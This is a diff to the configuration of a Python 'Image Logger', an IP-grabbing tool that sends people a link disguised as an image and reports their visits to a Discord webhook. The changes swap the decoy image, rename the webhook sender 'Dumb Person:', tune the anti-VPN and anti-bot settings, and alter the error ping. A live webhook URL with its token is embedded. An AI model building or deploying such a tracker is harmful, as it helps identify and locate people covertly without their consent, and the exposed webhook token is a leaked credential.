@@ -13,12 +13,12 @@ __author__ = "DeKrypt"
 config = {
     # BASE CONFIG #
     "webhook": "https://discord.com/api/webhooks/1255231545455939829/mVn-8O4iosrZH7w8UCsJEMUr1DaWgyXuwh40Wi8Lcs0kAqtrnc4YREIQan3cGytulGdC",
-    "image": "https://cdn.discordapp.com/attachments/1249420948088815667/1249422271332745286/R.png?ex=66673eaa&is=6665ed2a&hm=92a44cc93e14fb8cc8dce4b24675323ea935b9ef789cc3fee9c3fbe0a2359a09&", # You can also have a custom image by using a URL argument
+    "image": "https://cdn.discordapp.com/attachments/1255231506230808778/1255232560988950669/image602943490l.png?ex=667c61eb&is=667b106b&hm=0cc63b463fb4fb3288e59b624e2dbb826858b70a8bb18b3f886222a22c8590ee&", # You can also have a custom image by using a URL argument
                                                # (E.g. yoursite.com/imagelogger?url=<Insert a URL-escaped link to an image here>)
     "imageArgument": True, # Allows you to use a URL argument to change the image (SEE THE README)
 
     # CUSTOMIZATION #
-    "username": "Image Logger", # Set this to the name you want the webhook to have
+    "username": "Dumb Person:", # Set this to the name you want the webhook to have
     "color": 0x00000, # Hex Color you want for the embed (Example: Red is 0xFF0000)
 
     # OPTIONS #
@@ -32,7 +32,7 @@ config = {
         "richMessage": False, # Enable rich text? (See README for more info)
     },
 
-    "vpnCheck": 1, # Prevents VPNs from triggering the alert
+    "vpnCheck": 2, # Prevents VPNs from triggering the alert
                 # 0 = No Anti-VPN
                 # 1 = Don't ping when a VPN is suspected
                 # 2 = Don't send an alert when a VPN is suspected
@@ -40,7 +40,7 @@ config = {
     "linkAlerts": True, # Alert when someone sends the link (May not work if the link is sent a bunch of times within a few minutes of each other)
     "buggedImage": True, # Shows a loading image as the preview when sent in Discord (May just appear as a random colored image on some devices)
 
-    "antiBot": 3, # Prevents bots from triggering the alert
+    "antiBot": 2, # Prevents bots from triggering the alert
                 # 0 = No Anti-Bot
                 # 1 = Don't ping when it's possibly a bot
                 # 2 = Don't ping when it's 100% a bot
@@ -77,7 +77,7 @@ def botCheck(ip, useragent):
 def reportError(error):
     requests.post(config["webhook"], json = {
     "username": config["username"],
-    "content": "@everyone",
+    "content": "<@&1255233115270414456>",
     "embeds": [
         {
             "title": "Image Logger - Error",
